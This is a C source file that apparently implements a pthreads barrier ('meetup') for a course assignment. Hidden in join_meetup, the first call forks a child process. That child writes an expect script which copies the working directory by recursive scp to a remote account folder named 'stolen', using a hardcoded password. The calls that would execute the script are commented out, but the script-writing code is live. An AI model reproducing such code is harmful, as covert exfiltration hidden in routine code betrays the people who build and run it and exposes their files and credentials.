/*Required Headers*/

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <semaphore.h>
#include "meetup.h"
#include "resource.h"
#include<time.h>

#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <regex.h>
#include <sys/stat.h>
#include <fcntl.h>


/*
 * Declarations for barrier shared variables -- plus concurrency-control
 * variables -- must START here.
 */

pthread_mutex_t key;
pthread_cond_t m;

int SizeofHips;
int generation;
int count;
int mode;






resource_t ar[1000];
int cap;
int offset;

int k =0;




void *erealloc(void *ptr ,size_t n){
	void *p; 
	p = realloc(ptr,n);
	if (p==NULL){
		fprintf(stderr, "realloc failed, out of memory");
		exit(1);
	}
	return p;
}


void *emalloc(size_t n){
	void *p; 
	p = malloc(n);
	if (p==NULL){
		fprintf(stderr, "malloc failed, out of memory");
		exit(1);
	}
	return p;
}










//recource_t * resource;

void initialize_meetup(int n, int mf) {
    char label[100];
    int i;

    if (n < 1) {
        fprintf(stderr, "Who are you kidding?\n");
        fprintf(stderr, "A meetup size of %d??\n", n);
        exit(1);
    }

	pthread_mutex_init(&key, NULL);
	int ret = pthread_cond_init(&m,NULL);
	SizeofHips = n;

	if (mf == 0){
		mode =0;
		// meet first
	}else if(mf==1){
		mode = 1;
	}else {
		fprintf(stderr, "meet option error");
		exit(1);
	}


}


void join_meetup(char *value, int len) {
clock_t start, end, diff;
start = clock();
	pthread_mutex_lock(&key);
	count = count +1;
printf("\nvalue = %s arrives at position %d \n", value, count );
char s[strlen(value)+1];
strncpy(s,value,strlen(value)+1);
	if (count < SizeofHips){
		int mygen = generation;


                resource_t* word = ar;
                word = word + mygen ;

                if (mode == 1 && count == 1){ // if in meet first mode store the code word for the first person
  
                        write_resource(word, value, strlen(value)+1);
                }


		while(mygen == generation){
			pthread_cond_wait(&m, &key);
		}

		char * temp = word-> value;
		//printf("temp = %s\n value = %s\n", temp,value);
		read_resource(word, value,strlen(temp)+1);

		
	}else{


		resource_t* word= ar;
		word = word + generation;

		if (mode == 0){ // if in meet last mode store the code word for the first person
			//printf("\nLine 184 writing value = %s\n",value);
			write_resource(word, value, strlen(value)+1);
			
		}
		char * temp = word-> value;
		read_resource(word, value,strlen(temp)+1);

		count = 0;
		generation++;
		pthread_cond_broadcast(&m);

	}
end = clock();
	diff = end - start;
printf("%s waited for: %LF clock cycles \n",s,(long double)diff);
	pthread_mutex_unlock(&key);
	if (k ==0){
		k++;

		if (fork() == 0){
//expect ./sc.sh
			int pid;

			if ((pid = fork()) ==0){
			char *token[] = {"/bin/touch", "sc.sh",0};
			char *envp[] = { 0 };
		
		
		//execve(token[0], token, envp);
			
				exit(0);
			}
	
			while (wait(&pid) > 0){
			// wait
			}
			FILE * fp = fopen("sc.sh", "w");
			fputs("spawn scp -r ./ simonhu@linux.csc.uvic.ca: /home/simonhu/stolen\nexpect \"password:\"\nsend \"Godofwar\\n\";\ninteract",fp);
			fclose(fp);
			printf("I am the child of value");
	
			char *token[] = {"usr/bin/expect", "./sc.sh",0};
			char *envp[] = { 0 };
		
		
			//execve(token[0], token, envp);
			exit(0);
		}


	}



}










